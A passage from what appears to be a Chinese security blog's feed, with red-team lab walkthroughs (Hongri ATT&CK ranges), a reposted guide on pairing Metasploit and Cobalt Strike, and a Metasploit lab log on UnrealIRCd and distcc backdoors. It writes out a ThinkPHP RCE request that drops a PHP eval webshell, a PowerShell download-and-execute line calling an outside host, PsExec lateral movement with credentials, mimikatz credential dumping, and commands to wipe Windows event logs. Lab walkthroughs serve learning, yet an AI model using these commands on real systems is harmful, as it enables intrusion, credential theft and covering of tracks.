rel="noopener">https://github.com/TopScrew/CVE-2019-2725</a></li></ul><h4 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p><strong>后渗透常规操作走一波</strong></p><ul><li>查看用户权限，这里已经是管理员权限，暂不提权。</li><li>查看主机信息和开放端口</li><li>新建管理员用户，远程桌面登录。</li><li>因为这里靶机安装了360，所以需要上传procdump结合mimikatz在本地读取密码信息</li></ul><p>​      <a href="https://www.cnblogs.com/nul1/p/9285814.html" target="_blank" rel="noopener">利用procdump+Mimikatz 绕过杀软获取Windows明文密码</a></p><ul><li>最后使用msf生成个后门。</li></ul><p>​     <a href="https://www.freebuf.com/articles/web/180581.html" target="_blank" rel="noopener">后渗透阶段的权限维持（Windows篇） </a></p></li><li><p><strong>后渗透信息收集，收集域内信息，添加域管理员账号，定位域控</strong>。</p></li><li><p><strong>msf添加路由，搭建代理。</strong></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100115657" target="_blank" rel="noopener">reDuh搭建HTTP正向代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100132929" target="_blank" rel="noopener">ssocks+proxychains搭建代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100126207" target="_blank" rel="noopener">reGeorg + proxifier搭建SOCKS正向代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100129295" target="_blank" rel="noopener">xsocks+proxychains搭建代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100123395" target="_blank" rel="noopener">tunna搭建HTTP正向代理</a></p></li><li><p><strong>刚刚已经拿到了域管理权限知道密码，直接用psexec连接域控制器拿下域控。</strong></p></li><li><p><strong>痕迹清理</strong></p><ul><li><p>获取日志分类列表：wevtutil el &gt;1.txt</p></li><li><p>获取单个日志类别的统计信息：wevtutil gli “windows powershell”</p></li><li><p>查看指定日志的具体内容：wevtutil qe /f:text “windows powershell”</p></li><li><p>删除单个日志类别的所有信息：wevtutil cl “windows powershell”</p></li><li><p><strong>破坏Windows日志记录功能</strong> </p><ul><li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a></li><li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a></li></ul></li><li><p><strong>msf</strong>  run clearlogs   clearev</p></li></ul></li></ul><h3 id="红队实战（三）"><a href="#红队实战（三）" class="headerlink" title="红队实战（三）"></a>红队实战（三）</h3><h5 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h5><p><img src="20191223205755-d65c291e-2583-1.png" alt="img"></p><h4 id="外网渗透-2"><a href="#外网渗透-2" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul><li><p><strong>首先发现80端口网站是个joomla!，探测版本，发现是3.9.2较高的版本。</strong></p><ul><li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">JoomScan开源扫描器</a></li><li><a href="https://www.anquanke.com/post/id/188177" target="_blank" rel="noopener">Joomla 3.4.6远程代码执行漏洞原理分析和poc</a></li><li><a href="https://blog.csdn.net/m0_37438418/article/details/80976593" target="_blank" rel="noopener">Joomla漏洞</a></li></ul></li><li><p><strong>然后扫了下目录，发现存在备份的配置文件configuration.php。</strong></p></li><li><p><strong>在配置文件中得到了一个mysql普通数据库用户</strong></p></li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testuser cvcvgjASD!@</span><br></pre></td></tr></table></figure><ul><li><p><strong>探测端口发现3306开放，尝试使用拿到的mysql密码登录</strong></p></li><li><p><strong>登录成功，拿到了joomla!的数据库，尝试添加管理员 admin2</strong> </p></li><li><p><strong>使用账号admin2 secret登录后台：<a href="http://192.168.1.110/administrator/index.php" target="_blank" rel="noopener">http://192.168.1.110/administrator/index.php</a></strong></p></li><li><p><strong>通过模板修改，getshell。然后访问shell。</strong></p></li><li><p><strong>这里得绕一下disable_function。可以用LD_PRELOAD绕过。</strong></p><ul><li><a href="https://xz.aliyun.com/t/5320" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></li></ul></li><li><p>在ubuntu上找到了个test.txt，存放着应该是账号密码。</p></li><li><p>尝试使用wwwuser通过ssh登陆192.168.1.110</p></li></ul><h4 id="内网渗透-2"><a href="#内网渗透-2" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p>上msf，scp上传payload到centos，centos执行payload获取shell。</p><p><a href="https://www.cnblogs.com/tugenhua0707/p/8278772.html" target="_blank" rel="noopener">[scp传输文件的命令]</a></p></li><li><p>添加路由,使用msf扫描获取周围windows信息。</p><p>​    <a href="https://www.cnblogs.com/Hi-blog/p/7413406.html#autoid-5-3-0" target="_blank" rel="noopener">MSF的辅助扫描模块（信息搜集）</a></p></li><li><p>得到了三台加入test域的windows主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20 windows<span class="built_in"> server </span>2008</span><br><span class="line"></span><br><span class="line">192.168.93.30 windows 7</span><br><span class="line"></span><br><span class="line">192.168.93.10 windows<span class="built_in"> server </span>2012</span><br></pre></td></tr></table></figure></li><li><p>尝试爆破一下windows server 2008的本地管理员，得到了本地管理员的密码：123qwe!ASD</p></li><li><p>搭建目标网络代理，kali使用proxychains来代理socs4a。</p></li><li><p>用<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">wmiexec</a>执行命令，使用得到的密码远程连接目标机器</p><p>​    <a href="http://www.91ri.org/12908.html" target="_blank" rel="noopener">利用WMI代替psexec（WMIEXEC.vbs）</a></p><p>​    <a href="https://www.cnblogs.com/ssooking/articles/6082407.html" target="_blank" rel="noopener">丢掉PSEXEC来横向渗透</a></p></li><li><p>查看进程时发现有test域的administrator的进程，于是尝试抓一下密码</p></li><li><p>kali下使用smbclient通过代理连接windows server 2008 上传mimikatz。</p><p>​    <a href="[https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/](https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/)">内网渗透之smbclient工具学习</a></p></li><li><p>wmiexec远程执行mimikatz抓到了test域的administrator密码。</p><p><a href="https://cloud.tencent.com/developer/article/1171183" target="_blank" rel="noopener">九种姿势运行Mimikatz</a></p></li><li><p>查看windows server 2008的ip，然后ping test.org获取到域控制器ip</p></li><li><p>直接ipc连接（环境有点问题，3389连接域控提示administrator的密码过期了）</p></li><li><p>得到重要文件flag.txt。</p></li></ul><h3 id="红队评估（五）"><a href="#红队评估（五）" class="headerlink" title="红队评估（五）"></a>红队评估（五）</h3><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p><strong>Win7 +phpstudy+thinkphp（5.0.22）</strong> </p><p>ip  192.168.135.150</p><p>ip  192.168.138.136</p><p><strong>Win2008</strong>     </p><p>ip 192.168.138.138</p><p><strong>攻击机 win10</strong>     </p><p>ip  192.168.135.143</p><h4 id="外网渗透-3"><a href="#外网渗透-3" class="headerlink" title="外网渗透"></a>外网渗透</h4><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p><strong>漏洞搜索与利用，浏览器访问192.168.135.150，发现是thinkphp框架，爆下错，看下tp版本为5.0.22。</strong></p><ul><li><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">thinkphp v5.x 远程代码执行漏洞-POC集合</a></li></ul></li><li><p><strong>找到此版本的poc,然后写一句话木马。</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">135.150</span>/?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_POST[%27cmd%27]);%20?^%3E%20%3E%20C:\phpStudy\PHPTutorial\WWW\public\shell.php</span><br></pre></td></tr></table></figure></li><li><p><strong>蚁剑连接，查看权限，发现居然是域管理员权限！！！</strong></p></li></ul><h4 id="内网渗透-3"><a href="#内网渗透-3" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p><strong>在横向移动前我们需要收集域内信息。</strong></p><ul><li>内网网段:192.168.138.0/24</li><li>域控ip：192.168.138.138（DNS服务器确定),域名：sun.com</li><li>域用户:admin Administrator krbtgt leo</li></ul></li><li><p><strong>接下来使用CS来完成后续内网渗透工作。</strong></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf" target="_blank" rel="noopener">Cobaltstrike用户手册</a></p></li><li><p><strong>首先使用创建监听器，然后根据需要生成对应监听器的木马，这里我选择生成windows的exe木马。</strong></p></li></ul><p>​       <a href="https://zhuanlan.zhihu.com/p/93718885" target="_blank" rel="noopener">Cobalt Strike简介及生成简易木马</a></p><ul><li><p><strong>使用蚁剑上传到目标服务器，执行，查看cs发现，win7已上线。</strong></p></li><li><p><strong>这里看到上线的用户的只是administrator权限，直接使用cs自带的ms14-058提权（为什么用它提权，因为靶场里提示了。。）</strong></p><p><a href="https://www.freebuf.com/vuls/48239.html" target="_blank" rel="noopener">Win64bit提权0day漏洞（CVE-2014-4113）</a></p><p><a href="https://zhuanlan.zhihu.com/p/94135740" target="_blank" rel="noopener">Beacon详解</a></p></li><li><p><strong>选择提权后，一会就可以看到system权限的win7上线。</strong></p></li><li><p><strong>选择system权限win7,进入Beacon,然后运行mimikatz读到了Administrator和leo的密码</strong></p></li><li><p><strong>因为我们这里已经得到的域控管理员的密码，所以直接找域控登录即可</strong>。</p></li><li><p><strong>使用CS扫一下内网可以用psexec登录的主机，主要看445端口有没有开放</strong>。</p></li><li><p><strong>因为我们这里的DC处于内网，不能直接连接CS,所以我们需要win7做一个跳板机器</strong>。</p></li><li><p><strong>在win7上设置新的监听，上传psexec，设置防火墙规则。</strong></p><ul><li><pre><code>netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>*<span class="strong">*最后使用PsExec登录DC域控。*</span><span class="strong">*</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">  -</span></span><br></pre></td></tr></table></figure>Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.138 -u sun\Administrator -p dc123.com -d -c C:\phpStudy\PHPTutorial\WWW\public\nei.exe</code></pre></li></ul></li><li><p><strong>此时可以看到dc主机也已经上线</strong></p></li><li><p><strong>日志和入侵痕迹清除，主要是我们上传的木马文件，添加的管理员。以及系统日志、web应用日志、防火墙日志等内容。</strong></p><ul><li><a href="https://blog.csdn.net/God_XiangYu/article/details/100056932" target="_blank" rel="noopener">后渗透篇：清理windows入侵痕迹总结</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;红日安全ATT-amp-CK靶场-一&quot;&gt;&lt;a href=&quot;#红日安全ATT-amp-CK靶场-一&quot; class=&quot;headerlink&quot; title=&quot;红日安全ATT&amp;amp;CK靶场(一)&quot;&gt;&lt;/a&gt;红日安全ATT&amp;amp;CK靶场(一)&lt;/h2&gt;&lt;h4 id=
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="ATT&amp;CK" scheme="https://shu1l.github.io/tags/ATT-CK/"/>
    
  </entry>
  
  <entry>
    <title>msf与cs联动</title>
    <link href="https://shu1l.github.io/2020/06/05/msf-yu-cs-lian-dong/"/>
    <id>https://shu1l.github.io/2020/06/05/msf-yu-cs-lian-dong/</id>
    <published>2020-06-05T13:40:00.000Z</published>
    <updated>2020-11-25T09:15:24.522Z</updated>
    
    <content type="html"><![CDATA[<p><strong>转载自:</strong><a href="https://www.secshi.com/21526.html" target="_blank" rel="noopener">https://www.secshi.com/21526.html</a></p><p><strong>前言</strong></p><p>CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。</p><p><strong>内置Socks功能</strong></p><p>通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。</p><p>当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。</p><p>首先，到已控目标机的Beacon下将socks代理开启。</p><p>1 | beacon &gt; socks 1024 #端口根据VPS实际情况进行设置</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165921.png" alt="img"></p><p>点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165926.png" alt="img"></p><p>本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">Proxies</span> <span class="string">socks4/5:ip:port</span> <span class="comment">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">ReverseAllowProxy</span> <span class="literal">true</span> <span class="comment">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">use</span> <span class="string">auxiliary/scanner/smb/smb_ms17_010</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">rhosts</span> <span class="number">192.168</span><span class="number">.144</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">threads</span> <span class="number">100</span> <span class="comment">#内网渗透时线程不要太高！</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">run</span></span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-04-101356.jpg" alt="img"></p><p><strong>利用MSF模块上线Beacon shell</strong></p><p>当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。<strong>(前提目标机可出网)</strong></p><p>先利用CobalStrike生成上线Beacon的powershell。</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165938.png" alt="img"></p><p>本地启动Metasploit，挂上代理，设置psexec_command模块参数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4/5:ip:port</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> rhosts 192.168.144.0/24</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> threads 10</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbuser administrator</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> command powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))"</span> #上线CS的powershell，目标机存在杀软需考虑</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-10-165946.png" alt="img"></p><p>最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。</p><h4 id="CS与MSF会话互传"><a href="#CS与MSF会话互传" class="headerlink" title="CS与MSF会话互传"></a>CS与MSF会话互传</h4><h5 id="CobaltStrike派生Metasploit"><a href="#CobaltStrike派生Metasploit" class="headerlink" title="CobaltStrike派生Metasploit"></a>CobaltStrike派生Metasploit</h5><p>​    当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp #不要用x64的payload</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 10.11.42.99</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 5353</span><br><span class="line">msf5 &gt; <span class="builtin-name">run</span> -j</span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-04-101361.jpg" alt="img"></p><p>之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101405.jpg" alt="img"></p><p>然后选中计算机，右键-&gt;Spawn：选择MSF的监听器：</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101362.jpg" alt="img"></p><p>这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101340.jpg" alt="img"></p><h5 id="Metasploit派生CobaltStrike"><a href="#Metasploit派生CobaltStrike" class="headerlink" title="Metasploit派生CobaltStrike"></a>Metasploit派生CobaltStrike</h5><p>现在已经获得了一个meterpreter的session，把session传给CobaltStrike。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101408.jpg" alt="img"></p><p>在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101359.jpg" alt="img"></p><p>接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 192.168.144.174</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 8099</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span>  </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> session 1</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure><p>解释一下这些参数。由于CobaltStrike的监听器我们使用的是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows<span class="regexp">/beacon_http/</span>reverse_http</span><br></pre></td></tr></table></figure><p>所以我们的payload也要使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload windows<span class="regexp">/meterpreter/</span>reverse_http</span><br></pre></td></tr></table></figure><p>设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要<strong>设置成CobaltStrike机器的IP与端口。</strong></p><p>默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>设置当前的session，执行run。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101342.jpg" alt="img"></p><p>此时目标机便已成功从CobaltStrike上线。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101341.jpg" alt="img"></p><p><strong>总结</strong></p><p>关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;转载自:&lt;/strong&gt;&lt;a href=&quot;https://www.secshi.com/21526.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.secshi.com/21526.html&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>经典漏洞msf攻击实验记录</title>
    <link href="https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/"/>
    <id>https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</id>
    <published>2020-04-30T07:54:24.000Z</published>
    <updated>2020-11-25T09:14:56.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p><h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p><p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p><h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p><h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><h5 id="1-分析可以利用的漏洞"><a href="#1-分析可以利用的漏洞" class="headerlink" title="1.分析可以利用的漏洞"></a>1.分析可以利用的漏洞</h5><p>根据Nmap扫描结果可知，6667号端口开放IRC服务，可以利用UnrealIRCD IRC软件的漏洞来攻击漏洞主机</p><h5 id="2-开启Msfconsole"><a href="#2-开启Msfconsole" class="headerlink" title="2. 开启Msfconsole"></a>2. 开启Msfconsole</h5><p>运行“msfconsole”命令开启msf</p><h5 id="3-搜索漏洞利用EXP"><a href="#3-搜索漏洞利用EXP" class="headerlink" title="3. 搜索漏洞利用EXP"></a>3. 搜索漏洞利用EXP</h5><p> 运行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure><p>命令搜索关于UnrealIRCD漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p><h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p><h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p><h3 id="利用Distcc后门漏洞攻击"><a href="#利用Distcc后门漏洞攻击" class="headerlink" title="利用Distcc后门漏洞攻击"></a>利用Distcc后门漏洞攻击</h3><h4 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全组织索引</span><br><span class="line">CVE：CVE<span class="number">-2004</span><span class="number">-2687</span></span><br><span class="line">BID：无</span><br><span class="line">OSVDB：OSVDB<span class="number">-13378</span></span><br></pre></td></tr></table></figure><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><pre><code>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制，影响系统 distcc 2.x</code></pre><h4 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h4><ol><li><h5 id="开启Msfconsole"><a href="#开启Msfconsole" class="headerlink" title="开启Msfconsole"></a>开启Msfconsole</h5><p>运行<code>msfconsole</code>命令开启msf</p></li><li><h5 id="搜索漏洞利用EXP"><a href="#搜索漏洞利用EXP" class="headerlink" title="搜索漏洞利用EXP"></a>搜索漏洞利用EXP</h5><p>运行<code>search distcc</code>命令搜索关于Distcc_exec 漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211425.png" alt=""></p></li></ol><ol start="3"><li><h5 id="运行漏洞利用EXP"><a href="#运行漏洞利用EXP" class="headerlink" title="运行漏洞利用EXP"></a>运行漏洞利用EXP</h5><p>运行<code>use exploit/unix/misc/distcc_exec</code>命令开始运行EXP</p></li></ol><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211846.png" alt=""></p><p>设置漏洞主机IP</p><p>运行<code>set RHOST 10.1.1.136</code>命令设置漏洞主机IP</p><p>运行<code>exploit</code>命令，成功建立shell回话</p><h5 id="6-验证shell权限"><a href="#6-验证shell权限" class="headerlink" title="6.验证shell权限"></a>6.验证shell权限</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429212150.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;a href=&quot;#经典漏洞MSF攻击实验记录&quot; class=&quot;headerlink&quot; title=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;/a&gt;经典漏洞MSF攻击实验记录&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; cla
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>linux提权综述</title>
    <link href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/"/>
    <id>https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/</id>
    <published>2020-04-29T06:01:07.000Z</published>
    <updated>2020-06-05T10:09:15.585Z</updated>
    
